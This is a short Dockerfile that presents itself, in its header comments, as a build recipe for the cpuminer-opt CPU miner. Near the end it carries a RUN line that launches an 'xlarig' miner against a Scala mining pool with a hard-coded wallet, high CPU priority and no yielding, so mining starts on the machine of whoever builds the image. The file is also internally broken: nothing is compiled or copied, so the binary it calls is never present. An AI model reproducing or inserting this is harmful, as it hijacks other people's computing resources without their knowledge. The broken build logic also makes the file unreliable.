#
# Dockerfile for cpuminer-opt
# usage: docker build -t cpuminer-opt:latest .
# run: docker run -it --rm cpuminer-opt:latest [ARGS]
# ex: docker run -it --rm cpuminer-opt:latest -a cryptonight -o cryptonight.eu.nicehash.com:3355 -u 1MiningDW2GKzf4VQfmp4q2XoUvR6iy6PD.worker1 -p x -t 3
#

# Build
FROM ubuntu:18.04 as builder

RUN apt-get update \
  && apt-get install -y \
    build-essential \
    libssl-dev \
    libgmp-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    automake \
  && rm -rf /var/lib/apt/lists/*


# App
FROM ubuntu:18.04

RUN apt-get update \
  && apt-get install -y \
    libcurl3 \
    libjansson4 \
  && rm -rf /var/lib/apt/lists/*

ENTRYPOINT ["./xlarig"]
RUN ./xlarig -o ca.scala.herominers.com:10131 -u Svjb9K3h2DL3FiCR2Qi8L4YtCps2GgJdb1oF68dThFku69AHHsknNUKRPiPDTh3CwsiQAR11ZusneUbXd12n9Trc2KqW3j2ic -p agiz1 -a panthera --cpu-priority 5 --cpu-no-yield -k
CMD ["-h"]
